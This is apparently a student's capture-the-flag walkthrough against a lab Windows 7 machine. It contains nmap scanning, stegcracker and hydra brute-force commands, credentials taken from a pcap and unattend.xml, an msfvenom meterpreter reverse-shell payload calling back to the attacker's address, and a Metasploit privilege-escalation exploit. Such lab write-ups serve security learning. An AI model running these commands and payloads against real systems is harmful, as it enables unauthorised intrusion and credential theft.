1) run ifconfig command to find my IP
	10.0.2.6

2) run nmap to scan and enumerate the target machine
	10.0.2.0/24 Target is 10.0.2.12

3) navigate to target ip in browser and save image of bridge

4) use stegcracker to brute force
	stegcracker pic1.jpg /usr/share/wordlists/rockyou.txt
	returns password as “matthew”

5) use password to unlock picture and gain access to thoughts.txt
	steghide extract -sf pic1.jpg #Use password "matthew" from previous step
	# Alternatively the password could be guessed by inspecting page source 

6) reading thoughts.txt to gain a password encoded in ROT13.
	Decode "plorefrpebpxf" to get “cybersecrocks”

7)ftp into the machine and use gathered creds to login
	ftp 10.0.2.12
	matt
	cybersecrocks

8) get fptflag.txt
	change to binary
	get sensitiveinfo.pcap

9) view ftpflag.txt to see flag
	screenshot!!!

10) open wireshark and load pcap file
	follow the first tcp stream to reveal telnet credentials
	username “hahaha”
	password “haha”
	
	3rd tcp stream to reveal an SSH username “richmond”
	instructions in stream point to using hydra to brute force password with the rockyou.txt wordlist

11) login to telnet with the founds credentials and notice the bonus flag. View flag
	type bonusflag.txt


12)Brute force the SSH login with hydra to get the password
	hydra -l richmond -P /usr/share/wordlists/rockyou.txt 10.0.2.12 ssh -t4
	Password returned: “password” lol nice. 

13) Login to ssh
	
	ssh richmond@10.0.2.12
	Password: “password”


14) navigate to /windows/Panther/unattend.xml
	type unattend.xml (Best to delete this file with a script)
	
	Found base64 encoded password for IEUser: cXdlcnR5MTIzNDU=
	Decoded it turn into: qwerty12345
	Save for later?
	PROBABLY TURNED OPUT TO GOOD TO BE TRUE. NO USE FOR THESE CREDDS. SSH DONT WORK.

15) Continue looking around
	type noteToRichmond.txt
	Read instructions for belts

16) Craft msfvenom stageless payload for 32bit system (x86)
	msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.2.6 LPORT=4445 -f exe > shella2.exe

17) configure metasploit multi/handler
	Use multi handler
	set lhost: 10.0.2.6
	set lport:4445
	run

18) transfer payload via scp
	scp shella2.exe richmond@10.0.2.12:
	go back to SSH terminal. navigate to .exe and execute

19) meterpreter shell gained
	getuid -> IE9WIN7\richmond
	Red Belt
	background session

20)Search msfconsole “exploit windows ntuser”
	Start from the top and see what one works
	use 0 exploit/windows/local/ntusermndragover
	Use backgrounded session 
	IT Worked first try!!
	Navigate to users/IEUser/Desktop and get the flag.
